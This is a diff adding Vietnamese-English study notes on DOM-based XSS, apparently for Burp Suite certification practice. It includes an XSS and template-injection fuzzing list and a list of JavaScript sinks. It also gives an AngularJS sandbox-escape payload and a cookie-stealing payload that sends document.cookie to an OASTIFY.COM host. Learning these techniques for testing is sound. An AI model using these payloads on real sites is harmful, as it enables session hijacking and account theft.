@@ -127,6 +127,119 @@ NOTE: always open source code to see some comment of dev ; it can reveal some hi
 ## SCANNING
 
 - [ ] **21/4** — Discovering vulnerabilities quickly with targeted scanning
+DOM base XSS xảy ra khi attacker lấy dữ liệu từ nguồn có thể kiểm soát truyền đoạn code đó đến 1 đoạn **sink** có thể thực thi mã js 
+And we can using fuzz to check liệu rằng có thể escape được không
+
+ 
+```code!
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
+
+>
+<>
+\'
+\"
+\'\"
+'
+"
+'"
+<script>
+<script>fuzzer
+</script>
+<script></script>
+{{7*7}}
+{{fuzzer}}
+$(alert(1)}
+$(fuzzer}
+${7*7}
+${alert(1)}
+"-prompt(69)-"
+'-prompt(69)-'
+"-alert(1)-"
+'-alert(1)-'
+-prompt(69)-
+"fuzzer
+'fuzzer
+fuzzer
+<fuzzer>
+<script>{{7*7}}
+{{7*7}}fuzzer
+<script>alert(1)</script>
+<script>prompt(69)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"-alert(1)-"fuzzer
+"><fuzzer>
+<>"'
+<>\'\"
+<>"'<script>
+<>"'<script>{{7*7}}
+<>"'<script>{{7*7}}$(alert(1)}
+<>"'<script>{{7*7}}$(alert(1)}"-prompt(69)-"
+<>\'\"<script>{{7*7}}
+<>\'\"<script>{{7*7}}$(alert(1)}
+<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"
+{{7*7}}$(alert(1)}
+{{7*7}}$(alert(1)}"-prompt(69)-"
+$(alert(1)}"-prompt(69)-"
+\'
+\"
+\
+"><script>{{7*7}}</script>
+'><script>{{7*7}}</script>
+{{constructor.constructor('alert(1)')()}}
+{{constructor.constructor('prompt(69)')()}}
+"-{{7*7}}-"
+'-{{7*7}}-'
+"><svg>{{7*7}}</svg>
+<svg>{{7*7}}</svg>
+```
+And we can check one by one 
+
+
+```code!
+document.write()
+window.location
+document.cookie
+eval()
+document.domain
+WebSocket()
+element.src
+postMessage()
+setRequestHeader()
+FileReader.readAsText()
+ExecuteSql()
+sessionStorage.setItem()
+document.evaluate()
+JSON.parse
+ng-app
+URLSearchParams
+replace()
+innerHTML
+location.search
+addEventListener
+sanitizeKey()
+```
+And review source code to find sink ; which may be lead to exploit 
+![alt text](image-14.png)
+
+by the Dom Invader we can easy to find the sink ; and after let exploit 
+
+![alt text](image-15.png)
+Ở đây ta exploit lỗ hỏng ở AngularJS bằng payload sau : 
+```code!
+{{$on.constructor('alert(1)')()}}
+```
+Mở rộng hơn thế là cướp cookie 
+```code!
+{{$on.constructor('document.location="https://OASTIFY.COM?c="+document.cookie')()}}
+```
+[Resource của paylaod trên được láy ở đây](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md)
+hoặc [ở đây](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-reflected--1.0.1---1.1.5-(shorter))
+
+
+
+
+
 - [ ] **22/4** — Scanning non-standard data structures
 
 ---
